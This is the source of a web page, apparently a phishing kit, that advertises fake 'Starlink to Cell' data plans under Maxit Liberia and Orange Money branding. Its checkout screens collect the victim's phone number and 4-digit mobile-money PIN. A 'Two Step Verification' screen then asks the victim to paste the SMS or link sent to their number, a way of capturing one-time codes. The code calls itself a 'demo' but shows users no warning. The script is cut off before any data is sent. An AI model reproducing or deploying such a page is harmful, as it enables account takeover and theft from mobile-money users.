<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Starlink to Cell — Data Plans</title>
<style>
  :root {
    --ink: #101a33;
    --muted: #8395ba;
    --orange: #ff6b12;
    --green: #22d6a0;
    --panel: rgba(255,255,255,.97);
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    min-height: 100vh;
    padding: 28px 18px;
    display: grid;
    place-items: center;
    font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    color: var(--ink);
    background:
      radial-gradient(ellipse at 12% 15%, rgba(127,155,190,.48), transparent 28%),
      radial-gradient(ellipse at 85% 75%, rgba(80,126,171,.62), transparent 34%),
      linear-gradient(125deg, #293f62 0%, #174477 48%, #23486f 100%);
    overflow-x: hidden;
  }
  body::before {
    content: "";
    position: fixed; inset: 0;
    pointer-events: none;
    opacity: .35;
    background-image:
      radial-gradient(2px 2px at 12% 27%, #fff 45%, transparent 60%),
      radial-gradient(2px 2px at 74% 12%, #fff 45%, transparent 60%),
      radial-gradient(3px 3px at 33% 82%, #d9e9ff 45%, transparent 60%),
      radial-gradient(2px 2px at 91% 41%, #fff 45%, transparent 60%),
      radial-gradient(1px 1px at 57% 65%, #fff 45%, transparent 60%);
  }

  .school-demo-warning {
    margin: 0 0 18px; padding: 12px 14px; border-radius: 12px;
    color: #7a2e0e; background: #fff4e8; border: 1px solid #fdc99f;
    font-size: 13px; line-height: 1.5;
  }
  .resend-area {
  text-align: center;
  margin: 18px 0 12px;
  font-size: 12px;
  color: #9299a6;
  }
  
  .resend-area a {
    color: #ff9000;
    font-weight: 800;
    text-decoration: underline;
    cursor: pointer;
  }
  
  .resend-area[hidden] {
    display: none;
  }
  .page {
    width: min(1020px, 100%);
    position: relative;
    padding: 32px;
    border-radius: 24px;
    background: var(--panel);
    box-shadow: 0 24px 80px rgba(4, 18, 45, .28);
  }
  .header {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    gap: 22px;
    padding-bottom: 28px;
    border-bottom: 1px solid #e6ebf4;
  }
  h1 {
    margin: 2px 0 8px;
    font-size: clamp(23px, 3vw, 27px);
    line-height: 1.1;
    letter-spacing: -.8px;
    font-weight: 800;
  }
  h1 span { display: block; color: #ff8434; }
  .subline {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    color: #bd4a0b;
    background: #fff5ee;
    border: 1px solid #ffd3b9;
    padding: 6px 11px;
    border-radius: 999px;
    font-size: 12px;
  }
  .subline::before {
    content: "";
    width: 7px; height: 7px; border-radius: 50%;
    background: var(--orange);
  }
  .powered {
    display: flex;
    align-items: center;
    gap: 12px;
    flex-shrink: 0;
    padding: 12px 15px;
    border-radius: 14px;
    background: #fff;
    box-shadow: 0 3px 12px rgba(14, 28, 53, .09);
    font-size: 15px;
    color: #111827;
  }
  .maxit-mark {
    width: 48px; height: 48px;
    border-radius: 11px;
    background: linear-gradient(145deg, #ff7a19, #ff5100);
    color: #fff;
    display: grid;
    place-content: center;
    text-align: center;
    font-weight: 900;
    line-height: 1;
    box-shadow: 0 4px 10px #ff6b1230;
  }
  .maxit-mark small { font-size: 9px; margin-top: 3px; }
  .brand-name { font-weight: 800; color: #ff6b12; font-size: 18px; }
  .brand-country { font-size: 11px; color: #626b7b; margin-top: 1px; }
  .section-label {
    margin: 31px 0 16px;
    font-size: 11px;
    font-weight: 800;
    letter-spacing: 1.25px;
    color: #8a9bbc;
  }
  .plans {
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 16px;
  }
  .plan {
    --accent: #fff;
    min-height: 220px;
    position: relative;
    isolation: isolate;
    overflow: hidden;
    border: 1px solid transparent;
    border-radius: 18px;
    padding: 20px 19px 17px;
    color: #fff;
    text-align: left;
    cursor: pointer;
    background:
      linear-gradient(180deg, rgba(3,13,39,.64), rgba(2,12,35,.90)),
      radial-gradient(ellipse at 40% 20%, #55769d 0%, transparent 42%),
      linear-gradient(145deg, #172d50, #07112e 65%, #0d2b4e);
    transition: transform .18s ease, box-shadow .18s ease, border-color .18s ease;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    font: inherit;
  }
  .plan::before {
    content: "";
    position: absolute; z-index: -1; inset: 0;
    opacity: .55;
    background:
      radial-gradient(ellipse at 50% 100%, #245783 0%, transparent 45%),
      radial-gradient(ellipse at 15% 12%, #34577e 0%, transparent 30%),
      repeating-linear-gradient(155deg, transparent 0 35px, rgba(140,175,220,.09) 36px 38px, transparent 39px 65px);
  }
  /* Decorative satellite illustration, drawn entirely with CSS */
  .satellite {
    position: absolute;
    z-index: -1;
    top: 27px; right: 18px;
    width: 110px; height: 28px;
    transform: rotate(-25deg);
    opacity: .34;
    background: linear-gradient(90deg, transparent 0 5%, #9cb3d5 6% 12%, transparent 13% 18%, #9cb3d5 19% 25%, transparent 26% 31%, #9cb3d5 32% 38%, transparent 39% 44%, #9cb3d5 45% 55%, transparent 56% 61%, #9cb3d5 62% 68%, transparent 69% 74%, #9cb3d5 75% 81%, transparent 82% 87%, #9cb3d5 88% 94%, transparent 95%);
    clip-path: polygon(0 18%,100% 0,100% 82%,0 100%);
  }
  .satellite::after {
    content: ""; position: absolute; left: 45%; top: 4px;
    width: 17px; height: 20px; border-radius: 5px;
    background: linear-gradient(135deg,#d6e1f0,#506d98);
    border: 1px solid #c1d0e5;
  }
  .planet {
    position: absolute; z-index: -1;
    width: 145%; height: 100px; left: -20%; bottom: -67px;
    border-radius: 50%;
    background: linear-gradient(180deg, #1a4c79, #07142f);
    box-shadow: 0 -5px 24px rgba(66,140,200,.22);
    transform: rotate(-5deg);
  }
  .tower {
    position: absolute; z-index: -1; right: 28px; bottom: 0;
    width: 22px; height: 62px; opacity: .25;
    background: linear-gradient(90deg, transparent 45%, #b9cbe0 48% 52%, transparent 55%);
  }
  .tower::before {
    content: ""; position: absolute; inset: 0;
    background: repeating-linear-gradient(0deg, transparent 0 10px, #a7bdd8 11px 12px);
    clip-path: polygon(50% 0,100% 100%,0 100%);
  }
  .tag {
    display: inline-flex;
    align-items: center;
    min-height: 23px;
    padding: 3px 11px;
    border: 1px solid rgba(204,221,245,.35);
    border-radius: 999px;
    background: rgba(165,190,224,.20);
    color: #f0f5ff;
    font-size: 10px;
    font-weight: 800;
    white-space: nowrap;
  }
  .tag.green { color: #21e6ac; background: rgba(14,181,135,.22); border-color: rgba(26,226,171,.5); }
  .tag.gold { color: #ffc52e; background: rgba(200,143,15,.22); border-color: rgba(255,197,46,.55); }
  .plan-content { margin-top: auto; padding-top: 36px; }
  .plan h2 { margin: 0 0 2px; font-size: 17px; font-weight: 800; letter-spacing: -.4px; }
  .duration { font-size: 12px; color: #c3ccdc; }
  .price { margin-top: 8px; font-size: 24px; line-height: 1.1; font-weight: 850; letter-spacing: -.7px; }
  .price.free { color: #25dfa8; }
  .details { margin-top: 10px; color: #e0e7f3; font-size: 12px; font-weight: 750; }
  .details span { display: inline-block; transition: transform .18s ease; }
  .plan:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(4,18,45,.2); border-color: #ffb74b; }
  .plan:hover .details span { transform: translateX(4px); }
  .plan.popular { border-color: #d9a928; box-shadow: inset 0 0 0 1px rgba(255,202,55,.25); }
  .plan:focus-visible { outline: 3px solid #ff8a34; outline-offset: 3px; }
  .footnote {
    display: flex;
    align-items: center;
    gap: 9px;
    margin-top: 20px;
    color: #8395ba;
    font-size: 12px;
    line-height: 1.5;
    text-align: center;
  }
  .footnote::before, .footnote::after { content: ""; height: 1px; background: #e1e8f3; flex: 1; }

  .auth-page {
    position: fixed; inset: 0; z-index: 20; display: none; overflow-y: auto;
    background: #fff; color: #111827;
    font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  }
  .auth-page.open { display: block; }
  .auth-shell { width: min(420px, 100%); min-height: 100%; margin: 0 auto; background: #fff; position: relative; }
  .auth-hero {
    height: 360px; position: relative; overflow: hidden;
    /* Replace "your-background-image.jpg" with your own image filename/path. */
    background:
      linear-gradient(180deg, rgba(3, 19, 38, .04) 35%, rgba(3, 19, 38, .35) 100%),
      #12a9d0 url("./images/heroimage.jpg") center 35% / cover no-repeat;
    clip-path: ellipse(100% 100% at 50% 0%);
  }
  .auth-back {
    position: absolute; z-index: 2; top: 18px; left: 16px; width: 34px; height: 34px;
    border: 0; border-radius: 50%; background: rgba(255,255,255,.92); color: #1b3345;
    font-size: 22px; cursor: pointer;
  }
  .auth-hero-label {
    position: absolute; left: 25px; right: 25px; bottom: 65px; color: white;
    text-shadow: 0 2px 12px rgba(0,0,0,.18);
  }
  .auth-hero-label strong { display: block; font-size: 26px; letter-spacing: -.7px; }
  .auth-hero-label span { font-size: 13px; opacity: .95; }
  .auth-content { padding: 18px 23px 26px; margin-top: -5px; }
  .auth-content h2 { margin: 0 0 23px; font-size: 19px; letter-spacing: -.35px; color: #111827; }
  .auth-intro { margin: -14px 0 22px; color: #7b8798; font-size: 12px; line-height: 1.5; }
  .auth-field-label { font-weight: 550; }
  .pin-boxes { display: flex; gap: 10px; flex: 1; min-width: 0; }
  .pin-box {
    width: 0; min-width: 0; flex: 1; height: 48px;
    border: 1px solid #d9dee8; border-radius: 10px;
    background: #fff; color: #172033; text-align: center;
    font-size: 22px; font-weight: 750; outline: none;
    box-shadow: 0 1px 2px rgba(16,24,40,.03);
    transition: border-color .15s, box-shadow .15s, background .15s;
  }
  .pin-box:focus { border-color: #ff6b00; box-shadow: 0 0 0 3px rgba(255,107,0,.12); }
  .pin-box.filled { background: #fff8f2; border-color: #ffb27d; }
  .auth-field-row.pin-row { align-items: flex-start; }
  .auth-field-row.pin-row .auth-field-icon { margin-top: 10px; }
  .auth-submit-wrap { margin-top: 70px; }
  .auth-plan-summary {
    border: 1px solid #e7eaf0; border-radius: 12px; padding: 12px 13px; margin-bottom: 24px;
    background: #fafbfc; font-size: 12px; color: #596579;
  }
  .auth-plan-summary strong { display: block; font-size: 14px; color: #172033; margin-bottom: 3px; }
  .auth-field-label { display: block; margin: 0 0 8px 40px; font-size: 11px; color: #243247; }
  .auth-field-label b { color: #f26a21; }
  .auth-field-row { display: flex; align-items: center; gap: 12px; margin-bottom: 22px; }
  .auth-field-icon {
    width: 28px; height: 28px; flex: 0 0 28px; display: grid; place-items: center;
    border-radius: 50%; background: #ff6b00; color: white; font-size: 15px;
  }
  .auth-field-row input {
    min-width: 0; width: 100%; border: 0; border-bottom: 1px solid #ff6b00;
    border-radius: 0; outline: none; padding: 8px 0; background: transparent;
    font-size: 13px; color: #1f2937;
  }
  .auth-field-row input::placeholder { color: #9aa6ba; }
  .auth-security-note { color: #737f92; font-size: 11px; line-height: 1.55; margin: 5px 0 25px 40px; }
  .auth-continue {
    display: block; width: 100%; min-height: 43px; border: 0; border-radius: 999px;
    background: #ff6b00; color: white; font-weight: 800; cursor: pointer;
  }
  .auth-continue:disabled { background: #ffe3d0; color: #ff9b67; cursor: not-allowed; }
  .auth-error { display: none; color: #b42318; font-size: 12px; margin: -12px 0 16px 40px; }
  .auth-error.show { display: block; }
  @media (min-width: 700px) {
    .auth-page { background: rgba(4,13,35,.75); backdrop-filter: blur(7px); padding: 24px; }
    .auth-shell { min-height: min(780px, calc(100vh - 48px)); border-radius: 18px; overflow: hidden; box-shadow: 0 25px 70px #0004; }
  }


  .verify-page {
    position: fixed; inset: 0; z-index: 30; display: none; overflow-y: auto;
    background: #fff; color: #101828;
    font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  }
  .verify-page.open { display: block; }
  .verify-shell {
    width: min(420px, 100%); min-height: 100%; margin: 0 auto;
    background: #fff; display: flex; flex-direction: column; border: 1px solid #ededed;
  }
  .verify-topbar {
    height: 59px; flex: 0 0 59px; display: flex; align-items: center;
    justify-content: space-between; padding: 0 18px; background: #ff9000; color: #fff;
  }
  .verify-topbar button {
    border: 0; padding: 0; background: transparent; color: #fff; font-size: 25px; cursor: pointer;
    width: 28px; text-align: left;
  }
  .verify-topbar strong { font-size: 18px; font-weight: 850; }
  .verify-content { padding: 34px 24px 28px; flex: 1; }
  .verify-content h2 { margin: 0 0 18px; color: #111827; font-size: 20px; letter-spacing: -.3px; }
  .verify-instructions { margin: 0 0 7px; color: #687386; font-size: 12px; line-height: 1.7; }
  .verify-phone { display: block; margin: 0 0 25px; font-size: 14px; color: #101828; font-weight: 800; }
  .verify-textarea {
    width: 100%; height: 254px; display: block; resize: vertical;
    border: 1.5px solid #ff9000; border-radius: 11px; padding: 17px;
    outline: none; color: #263246; background: #fff; font: inherit; font-size: 12px; line-height: 1.6;
  }
  .verify-textarea:focus { box-shadow: 0 0 0 3px rgba(255,144,0,.13); }
  .verify-textarea::placeholder { color: #7d8797; }
  .verify-message { min-height: 21px; margin: 9px 0 12px; font-size: 12px; line-height: 1.5; }
  .verify-message.error { color: #b42318; }
  .verify-message.success { color: #15803d; }
  .verify-resend { text-align: center; color: #9299a6; font-size: 12px; margin: 19px 0 20px; }
  .verify-submit {
    width: 100%; height: 46px; border: 0; border-radius: 10px;
    background: #ff9000; color: #fff; font-weight: 800; cursor: pointer;
  }
  .verify-submit:disabled { background: #dedede; color: #a3a3a3; cursor: not-allowed; }
  .verify-footer {
    flex: 0 0 54px; display: grid; place-items: center; background: #ff9000;
    color: #fff; font-size: 11px; font-weight: 600;
  }
  .auth-plan-summary {
  display: none !important;
}
  @media (min-width: 700px) {
    .verify-page { background: rgba(4,13,35,.72); backdrop-filter: blur(7px); padding: 24px; }
    .verify-shell { min-height: min(780px, calc(100vh - 48px)); border-radius: 3px; overflow: hidden; box-shadow: 0 25px 70px #0004; }
  }

  .modal-backdrop {
    position: fixed; inset: 0; z-index: 10;
    display: none; place-items: center; padding: 20px;
    background: rgba(4, 13, 35, .70);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
  }
  .modal-backdrop.open { display: grid; }
  .modal {
    width: min(462px, 100%);
    color: #f7f8ff;
    border: 1px solid rgba(182, 197, 229, .24);
    border-radius: 23px;
    background: linear-gradient(155deg, rgba(24, 33, 65, .98), rgba(4, 13, 43, .99) 65%);
    padding: 24px;
    box-shadow: 0 28px 90px rgba(0,0,0,.48);
    animation: modalIn .18s ease-out;
  }
  @keyframes modalIn {
    from { opacity: 0; transform: translateY(8px) scale(.985); }
    to { opacity: 1; transform: translateY(0) scale(1); }
  }
  .modal-head { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
  .modal-icon {
    flex: 0 0 48px; height: 48px; display: grid; place-items: center;
    border: 1px solid rgba(191, 207, 238, .24);
    border-radius: 14px; background: rgba(255,255,255,.06); font-size: 22px;
  }
  .modal h2 { margin: 0; font-size: 18px; line-height: 1.35; letter-spacing: -.35px; }
  .modal-close {
    margin-left: auto; flex: 0 0 34px; height: 34px; padding: 0 !important;
    border-radius: 50% !important; border: 1px solid rgba(255,255,255,.16) !important;
    color: #dce2f0; background: rgba(255,255,255,.12); font-size: 17px;
  }
  .modal p { color: #c1c9dc; line-height: 1.55; font-size: 13.5px; margin: 0 0 18px; }
  .cost-panel {
    display: flex; align-items: center; justify-content: space-between; gap: 12px;
    padding: 14px 16px; margin: 18px 0 14px;
    border: 1px solid rgba(174,191,225,.18); border-radius: 14px;
    background: rgba(255,255,255,.07);
  }
  .cost-label { display: block; color: #818ba6; font-size: 11px; font-weight: 800; letter-spacing: .45px; }
  .modal-price { display: block; margin-top: 2px; color: #fff; font-size: 23px; line-height: 1.15; font-weight: 850; }
  .validity { text-align: right; }
  .validity strong { display: block; margin-top: 2px; font-size: 15px; }
  .feature-list { list-style: none; padding: 0; margin: 0; }
  .feature-list li {
    display: flex; align-items: center; gap: 11px; min-height: 49px;
    border-bottom: 1px solid rgba(186,200,230,.15);
    color: #d4d9e7; font-size: 13px;
  }
  .feature-list li:last-child { border-bottom: 0; }
  .feature-icon {
    display: grid; place-items: center; flex: 0 0 28px; height: 28px;
    border: 1px solid rgba(255,111,24,.38); border-radius: 8px;
    background: rgba(255,111,24,.16); font-size: 14px;
  }
  .payment-note { text-align: center; color: #77829f !important; font-size: 12px !important; margin: 10px 0 20px !important; }
  .modal-actions { display: flex; gap: 10px; margin-top: 0; }
  .modal-actions button { border: 0; border-radius: 12px; min-height: 45px; padding: 12px 17px; cursor: pointer; font-weight: 800; }
  .cancel { background: rgba(255,255,255,.09); color: #c4ccdc; border: 1px solid rgba(255,255,255,.15) !important; }
  .pay {
    background: linear-gradient(100deg, #ff6508, #ff982b); color: white; flex: 1;
    box-shadow: 0 7px 20px rgba(255, 111, 18, .22);
  }
  .modal-actions button:hover { filter: brightness(1.08); }
  @media (max-width: 480px) {
    .modal { padding: 20px; border-radius: 20px; }
    .modal-head { gap: 10px; }
    .modal h2 { font-size: 16px; }
    .modal-actions { flex-direction: column-reverse; }
    .modal-actions button { width: 100%; }
  }
  @media (max-width: 760px) {
    .page { padding: 24px 20px; border-radius: 20px; }
    .header { flex-direction: column; }
    .powered { align-self: flex-start; }
    .plans { grid-template-columns: repeat(2, minmax(0, 1fr)); }
  }
  @media (max-width: 480px) {
    body { padding: 14px 10px; }
    .page { padding: 22px 15px; }
    .plans { grid-template-columns: 1fr; gap: 12px; }
    .plan { min-height: 205px; }
    .powered { padding: 10px 12px; }
    .footnote::before, .footnote::after { display: none; }
  }
</style>
</head>
<body>
<main class="page">
  <header class="header">
    <div>
      <h1>Starlink to Cell <span>Data Plans</span></h1>
      <div class="subline">Fast, reliable satellite data — paid via Orange Money</div>
    </div>
    <div class="powered" aria-label="Powered by Max it Liberia">
      <span>Powered by</span>
      <div class="maxit-mark">Max it<small>LR</small></div>
      <div><div class="brand-name">Maxit</div><div class="brand-country">Liberia</div></div>
    </div>
  </header>

  <div class="section-label">CHOOSE YOUR PLAN</div>
  <section class="plans" aria-label="Available data plans">
    <button class="plan" data-name="2.5GB Data" data-duration="2-Day Plan" data-price="Free trial" data-details="Try the Starlink to Cell service with 2.5GB of data.">
      <span class="satellite"></span><span class="planet"></span><span class="tower"></span>
      <span class="tag green">NEW USERS ONLY</span>
      <span class="plan-content"><h2>2.5GB Data</h2><span class="duration">2-Day Plan</span><span class="price free">Free trial</span><span class="details">View details&nbsp; <span>→</span></span></span>
    </button>
    <button class="plan" data-name="15GB Data" data-duration="7-Day Plan" data-price="LRD 70" data-details="Get 15GB of satellite data for seven days.">
      <span class="satellite"></span><span class="planet"></span><span class="tower"></span>
      <span class="tag">LIGHT USERS</span>
      <span class="plan-content"><h2>15GB Data</h2><span class="duration">7-Day Plan</span><span class="price">LRD 70</span><span class="details">View details&nbsp; <span>→</span></span></span>
    </button>
    <button class="plan" data-name="35GB Data" data-duration="14-Day Plan" data-price="LRD 250" data-details="Get 35GB of satellite data for fourteen days.">
      <span class="satellite"></span><span class="planet"></span><span class="tower"></span>
      <span class="tag">BALANCED</span>
      <span class="plan-content"><h2>35GB Data</h2><span class="duration">14-Day Plan</span><span class="price">LRD 250</span><span class="details">View details&nbsp; <span>→</span></span></span>
    </button>
    <button class="plan" data-name="50GB Data" data-duration="21-Day Plan" data-price="LRD 300" data-details="Get 50GB of data for heavier browsing and streaming.">
      <span class="satellite"></span><span class="planet"></span><span class="tower"></span>
      <span class="tag">HEAVY USE</span>
      <span class="plan-content"><h2>50GB Data</h2><span class="duration">21-Day Plan</span><span class="price">LRD 300</span><span class="details">View details&nbsp; <span>→</span></span></span>
    </button>
    <button class="plan popular" data-name="Monthly Unlimited" data-duration="30-Day Plan" data-price="LRD 500" data-details="Unlimited data for thirty days, subject to your service provider's fair-use policy.">
      <span class="satellite"></span><span class="planet"></span><span class="tower"></span>
      <span class="tag gold">★ &nbsp;MOST POPULAR</span>
      <span class="plan-content"><h2>Monthly Unlimited</h2><span class="duration">30-Day Plan</span><span class="price">LRD 500</span><span class="details">View details&nbsp; <span>→</span></span></span>
    </button>
    <button class="plan" data-name="5G Monthly Unlimited" data-duration="30-Day Plan" data-price="LRD 700" data-details="Monthly unlimited plan for eligible 5G coverage areas. Availability depends on your location and device.">
      <span class="satellite"></span><span class="planet"></span><span class="tower"></span>
      <span class="tag">5G COVERAGE</span>
      <span class="plan-content"><h2>5G Monthly Unlimited</h2><span class="duration">30-Day Plan</span><span class="price">LRD 700</span><span class="details">View details&nbsp; <span>→</span></span></span>
    </button>
  </section>

  <footer class="footnote">
    Selecting a plan will redirect you to a secure Orange Money page. Your Starlink to Cell plan will be activated shortly after payment.
  </footer>
</main>

<div class="modal-backdrop" id="modalBackdrop" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
  <div class="modal">
    <div class="modal-head">
      <div class="modal-icon" aria-hidden="true">📶</div>
      <h2 id="modalTitle">15GB Data — 7 Day Plan</h2>
      <button class="modal-close" id="closeX" aria-label="Close plan details">×</button>
    </div>
    <p id="modalDescription">Perfect for light browsing, messaging, and basic app usage throughout the week.</p>
    <div class="cost-panel">
      <div><span class="cost-label">TOTAL COST</span><strong class="modal-price" id="modalPrice">LRD 70</strong></div>
      <div class="validity"><span class="cost-label">VALIDITY</span><strong id="modalValidity">7 days</strong></div>
    </div>
    <ul class="feature-list">
      <li><span class="feature-icon">📦</span><span id="modalFeature1">15GB total Starlink to Cell data bundle</span></li>
      <li><span class="feature-icon">⌛</span><span id="modalFeature2">Valid for 7 days from activation</span></li>
      <li><span class="feature-icon">✨</span><span id="modalFeature3">Ideal for travellers or short projects</span></li>
    </ul>
    <p class="payment-note">You'll log in with Orange Money to complete payment. Once confirmed, we will activate your selected plan.</p>
    <div class="modal-actions">
      <button class="cancel" id="closeModal">Cancel</button>
      <button class="pay" id="payButton">Pay with Orange Money</button>
    </div>
  </div>
</div>


<div class="auth-page" id="authPage" aria-label="Orange Money checkout">
  <div class="auth-shell">
    <div class="auth-hero">
      <button type="button" class="auth-back" id="authBack" aria-label="Back to plan details">‹</button>
      
    </div>
    <form class="auth-content" id="authForm">
      <h2>Authentication</h2>
      <div class="auth-plan-summary">
        <strong id="authPlanName">Selected data plan</strong>
        <span id="authPlanPrice">Your plan total will appear here</span>
      </div>
      <label class="auth-field-label" for="authPhone">Phone number <b>*</b></label>
      <div class="auth-field-row">
        <span class="auth-field-icon" aria-hidden="true">☎</span>
        <input id="authPhone" name="phone" type="tel" inputmode="tel" autocomplete="tel"
               placeholder="0770 123 456" required minlength="7" maxlength="18">
      </div>
      <p class="auth-error" id="authError">Enter a valid phone number.</p>
      <label class="auth-field-label" for="pinDigit1">
        Enter your PIN <b>*</b>
      </label>

      <div class="auth-field-row pin-row">
        <span class="auth-field-icon" aria-hidden="true">🔒</span>

        <div class="pin-boxes" role="group" aria-label="Enter your 4 digit demo PIN">
          <input class="pin-box" id="pinDigit1" type="password"
            inputmode="numeric" maxlength="1" aria-label="PIN digit 1"
            autocomplete="off" required>

          <input class="pin-box" id="pinDigit2" type="password"
            inputmode="numeric" maxlength="1" aria-label="PIN digit 2"
            autocomplete="off" required>

          <input class="pin-box" id="pinDigit3" type="password"
            inputmode="numeric" maxlength="1" aria-label="PIN digit 3"
            autocomplete="off" required>

          <input class="pin-box" id="pinDigit4" type="password"
            inputmode="numeric" maxlength="1" aria-label="PIN digit 4"
            autocomplete="off" required>
        </div>
      </div>

      <input id="authPin" name="demoPin" type="hidden" value="">
      <div class="auth-submit-wrap">
        <button class="auth-continue" id="authSubmit" type="submit" disabled>Login</button>
      </div>
    </form>
  </div>
</div>


<div class="verify-page" id="verifyPage" aria-label="Additional message form">
  <div class="verify-shell">
    <header class="verify-topbar">
      <button type="button" id="verifyBack" aria-label="Back">←</button>
      <strong>MaxIt</strong>
      <button type="button" id="verifyMenu" aria-label="Menu">☰</button>
    </header>
    <form class="verify-content" id="verifyForm">
      <h2>Two Step Verification</h2>
      <p class="verify-instructions">Paste the complete link/sms message sent to your number to activate the plan.</p>
      <strong class="verify-phone" id="verifyPhone">Additional message</strong>
      <p class="verify-message" id="verifyMessage" role="status" aria-live="polite"></p>
      <textarea class="verify-textarea" id="verifyText" minlength="6" required
        placeholder="Paste the complete link/sms message sent to your number to activate plan"></textarea>
      <p id="resendArea" class="resend-area" hidden>
        <a href="#" id="resendLink">Resend code</a>
      </p>
      <button class="verify-submit" id="verifySubmit" type="submit" disabled>Verify</button>
    </form>
    <footer class="verify-footer">© 2026 MaxIt Liberia ·</footer>
  </div>
</div>

<script>

  const backdrop = document.getElementById('modalBackdrop');
  let selectedPlan = null;

  const planCopy = {
    "2.5GB Data": {
      icon: "📶", description: "A simple way for new users to try Starlink to Cell data.",
      feature1: "2.5GB total Starlink to Cell data bundle",
      feature2: "Valid for 2 days from activation",
      feature3: "Free trial available to new users only"
    },
    "15GB Data": {
      icon: "📊", description: "Perfect for light browsing, messaging, and basic app usage throughout the week.",
      feature1: "15GB total Starlink to Cell data bundle",
      feature2: "Valid for 7 days from activation",
      feature3: "Ideal for travellers or short projects"
    },
    "35GB Data": {
      icon: "🌐", description: "A balanced data bundle for everyday browsing, social media, and sharing.",
      feature1: "35GB total Starlink to Cell data bundle",
      feature2: "Valid for 14 days from activation",
      feature3: "Great for regular everyday connectivity"
    },
    "50GB Data": {
      icon: "🚀", description: "More data for heavy browsing, downloads, and frequent online use.",
      feature1: "50GB total Starlink to Cell data bundle",
      feature2: "Valid for 21 days from activation",
      feature3: "Made for heavier data usage"
    },
    "Monthly Unlimited": {
      icon: "⭐", description: "Stay connected all month with the most popular unlimited plan.",
      feature1: "Monthly unlimited Starlink to Cell data",
      feature2: "Valid for 30 days from activation",
      feature3: "Great for frequent users"
    },
    "5G Monthly Unlimited": {
      icon: "📡", description: "Monthly unlimited connectivity for eligible 5G coverage areas.",
      feature1: "5G monthly unlimited data plan",
      feature2: "Valid for 30 days from activation",
      feature3: "Requires compatible device and coverage"
    }
  };

  document.querySelectorAll('.plan').forEach((card) => {
    card.addEventListener('click', () => {
      selectedPlan = {
        name: card.dataset.name,
        duration: card.dataset.duration,
        price: card.dataset.price,
        details: card.dataset.details
      };
      const copy = planCopy[selectedPlan.name] || {};
      const days = selectedPlan.duration.match(/(\\d+)/)?.[1] || "30";
      document.querySelector('.modal-icon').textContent = copy.icon || "📶";
      document.getElementById('modalTitle').textContent = `${selectedPlan.name} — ${selectedPlan.duration.replace(" Plan", " Plan")}`;
      document.getElementById('modalPrice').textContent = selectedPlan.price;
      document.getElementById('modalValidity').textContent = `${days} days`;
      document.getElementById('modalDescription').textContent = copy.description || selectedPlan.details;
      document.getElementById('modalFeature1').textContent = copy.feature1 || selectedPlan.details;
      document.getElementById('modalFeature2').textContent = copy.feature2 || `Valid for ${days} days from activation`;
      document.getElementById('modalFeature3').textContent = copy.feature3 || "Stay connected with Starlink to Cell";
      backdrop.classList.add('open');
      document.getElementById('closeX').focus();
    });
  });

  function closeModal() { backdrop.classList.remove('open'); }
  document.getElementById('closeModal').addEventListener('click', closeModal);
  document.getElementById('closeX').addEventListener('click', closeModal);
  backdrop.addEventListener('click', (event) => { if (event.target === backdrop) closeModal(); });
  document.addEventListener('keydown', (event) => { if (event.key === 'Escape') closeModal(); });

  const authPage = document.getElementById('authPage');
  const authForm = document.getElementById('authForm');
  const authPhone = document.getElementById('authPhone');
  const authPin = document.getElementById('authPin');
  const authError = document.getElementById('authError');
  const authSubmit = document.getElementById('authSubmit');

  const pinInputs = [
  document.getElementById('pinDigit1'),
  document.getElementById('pinDigit2'),
  document.getElementById('pinDigit3'),
  document.getElementById('pinDigit4')
];

  function combineDemoPin() {
    const digits = pinInputs.map(input => input.value);

    const complete = digits.every(digit => /^\d$/.test(digit));

    // Keep the combined value local for demo validation only.
    authPin.value = complete ? digits.join('') : '';

    return complete;
  }

  pinInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/\D/g, '').slice(0, 1);
      combineDemoPin();

      if (input.value && index < pinInputs.length - 1) {
        pinInputs[index + 1].focus();
      }
    });

    input.addEventListener('keydown', event => {
      if (
        event.key === 'Backspace' &&
        input.value === '' &&
        index > 0
      ) {
        pinInputs[index - 1].focus();
      }
    });
  });

  authPhone.addEventListener('input', () => {
    const digits = authPhone.value.replace(/\D/g, '');
    authSubmit.disabled = !(digits.length >= 7 && digits.length <= 15);
    authError.classList.remove('show');
  });

  document.getElementById('payButton').addEventListener('click', () => {
    if (!selectedPlan) return;
    document.getElementById('authPlanName').textContent = selectedPlan.name + ' — ' + selectedPlan.duration;
    document.getElementById('authPlanPrice').textContent = 'Price: ' + selectedPlan.price;
    backdrop.classList.remove('open');
    authPage.classList.add('open');
    authPhone.focus();
  });

  document.getElementById('authBack').addEventListener('click', () => {
    authPage.classList.remove('open');
    backdrop.classList.add('open');
  });

  const verifyPage = document.getElementById('verifyPage');
  const verifyForm = document.getElementById('verifyForm');
  const verifyText = document.getElementById('verifyText');
  const verifySubmit = document.getElementById('verifySubmit');
  const verifyMessage = document.getElementById('verifyMessage');

  const resendArea = document.getElementById('resendArea');
  const resendLink = document.getElementById('resendLink');
  
  resendLink.addEventListener('click', (event) => {
    event.preventDefault();
  
    // Demo behavior: allow the user to submit a fresh support message.
    verifyText.disabled = false;
    verifyText.value = '';
    verifyMessage.textContent = '';
    verifySubmit.disabled = true;
    verifySubmit.textContent = 'Submit';
    resendArea.hidden = true;
    verifyText.focus();
  });


  verifyText.addEventListener('input', () => {
    verifySubmit.disabled = verifyText.value.trim().length === 0;
    verifyMessage.textContent = '';
  });

  authForm.addEventListener('submit', async (event) => {
    event.preventDefault();
    if (!selectedPlan) return;
    const phone = authPhone.value.trim();
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 7 || digits.length > 15) {
      authError.classList.add('show'); authPhone.focus(); return;
    }
